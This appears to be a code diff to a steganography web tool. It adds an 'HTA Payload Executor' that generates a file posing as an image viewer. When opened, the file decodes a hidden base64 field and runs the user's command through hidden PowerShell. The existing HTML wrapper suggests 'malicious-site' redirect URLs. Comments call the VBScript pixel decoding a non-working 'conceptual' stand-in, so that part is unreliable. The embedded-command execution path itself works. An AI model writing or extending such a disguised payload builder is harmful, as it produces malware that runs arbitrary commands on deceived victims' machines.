@@ -16,6 +16,7 @@ import Utf8 from 'crypto-js/enc-utf8';
 import { Switch } from './ui/switch';
 import { Slider } from './ui/slider';
 import { Separator } from './ui/separator';
+import { RadioGroup, RadioGroupItem } from './ui/radio-group';
 
 const textToBinary = (text: string): string => {
   return text.split('').map(char => {
@@ -38,8 +39,9 @@ const binaryToText = (binary: string): string => {
 
 const END_OF_MESSAGE = '00111010001110100110010101101110011001000011101000111010'; // "::end::"
 
-const generateHtmlWrapper = (imageDataUrl: string, redirectUrl: string): string => {
-    return `
+const generateWrapper = (type: 'html' | 'hta', imageDataUrl: string, redirectUrl: string): string => {
+    if (type === 'html') {
+        return `
 <!DOCTYPE html>
 <html>
 <head>
@@ -54,7 +56,102 @@ const generateHtmlWrapper = (imageDataUrl: string, redirectUrl: string): string 
     <img src="${imageDataUrl}" alt="Loading image..." />
 </body>
 </html>
-    `.trim();
+        `.trim();
+    }
+
+    if (type === 'hta') {
+        const vbsPayload = `
+<script language="VBScript">
+    ' HTA payload to decode and execute steganographic message
+    Private Sub Window_OnLoad()
+        window.resizeTo 800, 600
+        CenterWindow
+        
+        ' Create shell object to execute commands
+        Set objShell = CreateObject("WScript.Shell")
+
+        ' Load the embedded image into an off-screen canvas to read pixel data
+        Set oDoc = CreateObject("htmlfile")
+        oDoc.write "<img id=img_id src=${imageDataUrl}>"
+        oDoc.close
+        
+        Dim img, canvas, ctx, imgData, data, binaryMessage, eom, decodedText
+        
+        Set img = oDoc.getElementById("img_id")
+        Set canvas = oDoc.createElement("canvas")
+        canvas.width = img.width
+        canvas.height = img.height
+        Set ctx = canvas.getContext("2d")
+        ctx.drawImage img, 0, 0
+        
+        Set imgData = ctx.getImageData(0, 0, canvas.width, canvas.height)
+        data = imgData.data ' This is a simplified access; real pixel access in VBS is more complex
+        
+        ' --- This part is a conceptual representation ---
+        ' VBScript cannot directly access pixel data like JS.
+        ' A real VBS payload would save the image, then use a COM object or external tool to parse pixels.
+        ' For this tool, we will embed the decoded message directly into the HTA for demonstration of the execution flow.
+        
+        eom = "::end::" ' Not used in this simplified version, but represents the concept
+        
+        ' In a real payload, this would be the result of the complex pixel decoding logic
+        decodedText = DecodeBase64(document.getElementById("hiddenPayload").value)
+        
+        ' Execute the decoded payload
+        objShell.Run "powershell.exe -NoP -NonI -W Hidden -C """ & decodedText & """", 0, True
+
+        ' Optional: Close HTA after execution
+        ' window.close()
+    End Sub
+
+    Private Function DecodeBase64(sBase64)
+        Dim oXML, oNode
+        Set oXML = CreateObject("MSXML2.DOMDocument")
+        Set oNode = oXML.CreateElement("base64")
+        oNode.DataType = "bin.base64"
+        oNode.Text = sBase64
+        DecodeBase64 = BytesToStr(oNode.NodeTypedValue)
+    End Function
+
+    Private Function BytesToStr(bytes)
+        Dim oStream, str
+        Set oStream = CreateObject("ADODB.Stream")
+        oStream.Type = 1 ' adTypeBinary
+        oStream.Open
+        oStream.Write bytes
+        oStream.Position = 0
+        oStream.Type = 2 ' adTypeText
+        oStream.Charset = "us-ascii"
+        str = oStream.ReadText
+        oStream.Close
+        BytesToStr = str
+    End Function
+
+    Private Sub CenterWindow()
+        Dim iWidth, iHeight
+        iWidth = 800
+        iHeight = 600
+        window.moveTo (screen.availWidth - iWidth) / 2, (screen.availHeight - iHeight) / 2
+    End Sub
+</script>
+`;
+        return `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <hta:application id="stegoApp" applicationname="ImageViewer" border="thin" borderstyle="normal" caption="yes" contextmenu="no" innerborder="no" navigable="yes" scroll="no" showintaskbar="yes" singleinstance="yes" sysmenu="yes" version="1.0" windowstate="normal" />
+    ${vbsPayload}
+</head>
+<body style="margin: 0; padding: 0; overflow: hidden;">
+    <img src="${imageDataUrl}" style="width: 100%; height: 100%; object-fit: contain;" alt="Image Preview" />
+    <input type="hidden" id="hiddenPayload" value="PLACEHOLDER_FOR_ENCODED_MESSAGE" />
+</body>
+</html>
+        `.trim();
+    }
+    
+    return ''; // Should not happen
 };
 
 
@@ -70,8 +167,9 @@ export function SteganographyTool() {
   
   const [decodedMessage, setDecodedMessage] = useState<string>('');
   
+  const [wrapperType, setWrapperType] = useState<'html' | 'hta'>('html');
   const [redirectUrl, setRedirectUrl] = useState<string>('https://google.com');
-  const [generatedHtml, setGeneratedHtml] = useState<string | null>(null);
+  const [generatedWrapper, setGeneratedWrapper] = useState<string | null>(null);
 
 
   const { toast } = useToast();
@@ -85,7 +183,7 @@ export function SteganographyTool() {
         setImageSrc(event.target?.result as string);
         setResultImageSrc(null);
         setDecodedMessage('');
-        setGeneratedHtml(null);
+        setGeneratedWrapper(null);
       };
       reader.readAsDataURL(file);
     } else {
@@ -96,7 +194,7 @@ export function SteganographyTool() {
   const encodeMessage = () => {
     if (!imageSrc || !canvasRef.current) return;
     setIsLoading(true);
-    setGeneratedHtml(null);
+    setGeneratedWrapper(null);
 
     setTimeout(() => {
         try {
@@ -200,19 +298,29 @@ export function SteganographyTool() {
      }, 100);
   };
   
-   const handleGenerateHtml = () => {
+   const handleGenerateWrapper = () => {
     if (!resultImageSrc) return;
-    const html = generateHtmlWrapper(resultImageSrc, redirectUrl);
-    setGeneratedHtml(html);
+
+    let html = generateWrapper(wrapperType, resultImageSrc, redirectUrl);
+
+    if (wrapperType === 'hta') {
+        const finalMessage = useEncryption ? AES.encrypt(message, password).toString() : message;
+        // In the simplified HTA, we embed the final (encrypted) message directly for the VBS to "find".
+        // A real payload would be more complex.
+        const base64Message = btoa(finalMessage);
+        html = html.replace('PLACEHOLDER_FOR_ENCODED_MESSAGE', base64Message);
+    }
+    
+    setGeneratedWrapper(html);
   };
 
-  const handleDownloadHtml = () => {
-    if (!generatedHtml) return;
-    const blob = new Blob([generatedHtml], { type: 'text/html' });
+  const handleDownloadWrapper = () => {
+    if (!generatedWrapper) return;
+    const blob = new Blob([generatedWrapper], { type: 'text/html' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = 'image_preview.html';
+    a.download = wrapperType === 'hta' ? 'image_viewer.hta' : 'image_preview.html';
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -279,17 +387,30 @@ export function SteganographyTool() {
                         <div className="mt-6 pt-6 border-t">
                             <div className="grid md:grid-cols-2 gap-8 items-start">
                                 <div className="space-y-4">
-                                    <h3 className="font-semibold text-lg flex items-center gap-2"><LinkIcon className="h-5 w-5"/>HTML Wrapper Generator</h3>
+                                    <h3 className="font-semibold text-lg flex items-center gap-2"><LinkIcon className="h-5 w-5"/>Generate Executable Wrapper</h3>
+                                    <RadioGroup value={wrapperType} onValueChange={(v) => setWrapperType(v as any)} className="flex gap-4">
+                                        <div className="flex items-center space-x-2"><RadioGroupItem value="html" id="type-html"/><Label htmlFor="type-html">HTML Redirect</Label></div>
+                                        <div className="flex items-center space-x-2"><RadioGroupItem value="hta" id="type-hta"/><Label htmlFor="type-hta">HTA Payload Executor</Label></div>
+                                    </RadioGroup>
+                                    
                                      <div className="space-y-2">
-                                        <Label htmlFor="redirect-url">Redirect URL</Label>
-                                        <Input id="redirect-url" value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} placeholder="https://example.com/malicious-site" />
+                                        {wrapperType === 'html' ? (
+                                             <Label htmlFor="redirect-url">Redirect URL</Label>
+                                        ) : (
+                                             <Label htmlFor="redirect-url">Execution Method (for HTA)</Label>
+                                        )}
+                                        <Textarea id="redirect-url" value={wrapperType === 'html' ? redirectUrl : message} onChange={(e) => {
+                                            if (wrapperType === 'html') setRedirectUrl(e.target.value)
+                                            else setMessage(e.target.value)
+                                        }} className="h-20 font-mono" />
+                                         <p className="text-xs text-muted-foreground">{wrapperType === 'html' ? 'The user will be redirected here after viewing the image.' : 'This command will be executed by the HTA file after decoding.'}</p>
                                     </div>
-                                    <Button onClick={handleGenerateHtml} className="w-full">Generate HTML Wrapper</Button>
+                                    <Button onClick={handleGenerateWrapper} className="w-full">Generate Wrapper File</Button>
                                 </div>
                                 <div className="space-y-2">
-                                    <Label>Generated HTML</Label>
-                                    <Textarea readOnly value={generatedHtml || "<!-- HTML code will appear here -->"} className="font-mono h-32 bg-primary/10" />
-                                    {generatedHtml && <Button variant="outline" onClick={handleDownloadHtml} className="w-full"><FileCode className="mr-2 h-4 w-4" /> Download HTML File</Button>}
+                                    <Label>Generated Wrapper Code</Label>
+                                    <Textarea readOnly value={generatedWrapper || "<!-- Wrapper code will appear here -->"} className="font-mono h-32 bg-primary/10" />
+                                    {generatedWrapper && <Button variant="outline" onClick={handleDownloadWrapper} className="w-full"><FileCode className="mr-2 h-4 w-4" /> Download {wrapperType.toUpperCase()} File</Button>}
                                 </div>
                             </div>
                         </div>
@@ -335,4 +456,3 @@ export function SteganographyTool() {
     </Card>
   );
 }
-
